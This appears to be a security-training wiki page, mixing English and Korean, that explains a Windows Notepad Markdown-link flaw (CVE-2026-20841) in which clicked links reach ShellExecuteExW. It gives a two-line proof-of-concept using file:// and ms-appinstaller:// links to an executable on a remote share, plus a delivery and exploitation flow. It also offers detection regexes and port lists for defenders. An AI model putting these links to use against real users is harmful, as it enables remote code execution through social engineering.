# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Modern Windows applications that render Markdown/HTML often turn user-supplied links into clickable elements and hand them to `ShellExecuteExW`. 스킴 허용 목록(scheme allowlisting)이 엄격하지 않으면, 등록된 아무 프로토콜 핸들러(예: `file:`, `ms-appinstaller:`)나 트리거되어 현재 사용자 컨텍스트에서 코드 실행으로 이어질 수 있습니다.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad는 고정된 문자열 비교(`sub_1400ED5D0()`)를 통해 **`.md` 확장자에 대해서만** Markdown 모드를 선택합니다.
- 지원되는 Markdown 링크:
- Standard: `[text](target)`
- Autolink: `<target>` (렌더링되어 `[target](target)`이 되므로), 두 문법 모두 페이로드 및 탐지에 영향을 줍니다.
- 링크 클릭은 `sub_140170F60()`에서 처리되며, 약한 필터링을 수행한 후 `ShellExecuteExW`를 호출합니다.
- `ShellExecuteExW`는 HTTP(S)뿐만 아니라 **구성된 모든 프로토콜 핸들러**로 전달됩니다.

### Payload considerations
- 링크 내의 모든 `\\` 시퀀스는 `ShellExecuteExW` 호출 전에 **`\\`이 `\`로 정규화**되어 UNC/경로 작성과 탐지에 영향을 미칩니다.
- `.md` 파일은 기본적으로 Notepad와 **연결되어 있지 않습니다**; 피해자가 파일을 Notepad로 열어 링크를 클릭해야 하지만, 일단 렌더링되면 링크는 클릭 가능해집니다.
- 위험한 예시 스킴:
- `file://` — 로컬/UNC 페이로드를 실행시키는 데 사용될 수 있습니다.
- `ms-appinstaller://` — App Installer 플로우를 트리거할 수 있습니다. 다른 로컬에 등록된 스킴들도 악용될 수 있습니다.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### 악용 흐름
1. Craft a **`.md` file** so Notepad renders it as Markdown.
2. Embed a link using a dangerous URI scheme (`file:`, `ms-appinstaller:`, or any installed handler).
3. Deliver the file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB or similar) and convince the user to open it in Notepad.
4. On click, the **정규화된 링크** is handed to `ShellExecuteExW` and the corresponding protocol handler executes the referenced content in the user’s context.

## 탐지 아이디어
- Monitor transfers of `.md` files over ports/protocols that commonly deliver documents: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parse Markdown links (standard and autolink) and look for **case-insensitive** `file:` or `ms-appinstaller:`.
- Vendor-guided regexes to catch remote resource access:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- 패치 동작은 보고에 따르면 **allowlists local files and HTTP(S)**; `ShellExecuteExW`에 도달하는 다른 모든 것은 의심스럽습니다. 시스템마다 attack surface가 다르므로 필요에 따라 다른 설치된 protocol handlers에 대한 탐지를 확장하세요.

## 참고자료
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
